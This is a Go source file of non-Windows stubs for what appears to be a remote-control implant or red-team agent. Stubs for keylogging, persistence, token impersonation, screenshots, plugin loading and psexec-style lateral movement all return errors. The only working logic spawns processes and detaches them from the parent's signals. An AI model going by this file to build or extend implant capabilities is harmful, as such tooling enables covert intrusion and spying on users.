//go:build !windows

package main

import (
	"context"
	"errors"
	"net/http"
	"os/exec"
	"syscall"
	"time"
)

func newCommand(name string, args ...string) *exec.Cmd {
	command := exec.CommandContext(agentContext, name, args...)
	command.WaitDelay = 2 * time.Second
	return command
}

// detachSpawnCommand starts a spawned agent in its own session so signals
// delivered to the parent's process group cannot stop it.
func detachSpawnCommand(command *exec.Cmd) {
	command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
}

// startDetachedAgent supports host-side tests; managed agents remain Windows-only.
func startDetachedAgent(command *exec.Cmd) (int, string, bool, error) {
	if err := command.Start(); err != nil {
		return 0, "", false, err
	}
	pid := command.Process.Pid
	go func() { _ = command.Wait() }()
	return pid, "exec", false, nil
}

func loadPluginPE(*http.Client, *config, string, string, string) (string, error) {
	return "", errors.New("PE plugins require the Windows agent build")
}

func loadPluginPEContext(context.Context, *http.Client, *config, string, string, string) (string, error) {
	return "", errors.New("PE plugins require the Windows agent build")
}

func runPluginChild([]string) error {
	return errors.New("plugin child mode requires the Windows agent build")
}

func runWindowsPluginChild([]string) error {
	return errors.New("Windows library child mode requires the Windows agent build")
}

func captureScreenshot() (string, error) { return "", errors.New("screenshots require Windows") }

func stopPlatformWorkers() {}

func keylogAction(string) (string, string, error) {
	return "", "output", errors.New("keylogging requires Windows")
}

func persistenceAction(bool, *config) (string, error) {
	return "", errors.New("persistence requires Windows")
}

func makeTokenAction(domain, user, password string) (string, error) {
	return "", errors.New("network identity commands require the Windows agent build")
}

func rev2selfAction() (string, error) {
	return "", errors.New("network identity commands require the Windows agent build")
}

func applyCommandToken(*exec.Cmd) {}

func reestablishThreadToken() {}

func suspendServerIdentity() (func() error, error) {
	return func() error { return nil }, nil
}

func processUserIdentity() string { return username() }

func activeNetworkIdentity() string { return "" }

func runAsWindowsService() bool { return false }

func runLateralChild([]string) error {
	return errors.New("lateral movement requires the Windows agent build")
}

func lateralPsexecGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
	return "", errors.New("lateral movement requires the Windows agent build")
}

func runLateralCleanupChild([]string) error {
	return errors.New("lateral movement requires the Windows agent build")
}

func runLateralDetach([]string) error {
	return errors.New("lateral movement requires the Windows agent build")
}

func newBoundedCommand(ctx context.Context, name string, args ...string) *exec.Cmd {
	command := exec.CommandContext(ctx, name, args...)
	command.WaitDelay = 2 * time.Second
	return command
}
